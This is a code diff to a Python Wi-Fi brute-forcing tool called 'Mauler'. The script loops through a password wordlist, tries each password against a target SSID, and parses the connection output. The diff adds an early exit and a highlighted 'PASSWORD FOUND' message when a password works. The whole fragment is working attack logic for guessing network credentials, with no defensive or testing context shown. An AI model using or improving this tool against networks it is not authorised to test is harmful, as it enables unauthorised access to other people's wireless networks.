@@ -29,10 +29,13 @@ class Mauler:
         output, error = status.communicate()
         if b"Error" in error:
             print("Non successfull candidate")
-        if b"Connection activation failed" in error:
+        elif b"Connection activation failed" in error:
             print("Possible candidate try manually connecting with that password!")
-        if b"successfully activated with" in output:
-            print(f"Password found {password}")
+        elif b"successfully activated with" in output:
+            print(f"\t ******PASSWORD FOUND: {password}******")
+            return True
+        else:
+            return False
 
     def brute_force(self,ssid, wordlist):
         wordlist = open(wordlist, "r")
@@ -41,7 +44,11 @@ class Mauler:
             password = password.replace("\n", "")
             print(f"Trying password", f"{password}")
             time.sleep(0.5)
-            self.connect_to_wifi(ssid, password)
+            if self.connect_to_wifi(ssid, password) == True:
+                wordlist.close()
+                break
+
+
 
 
 if __name__ == '__main__':
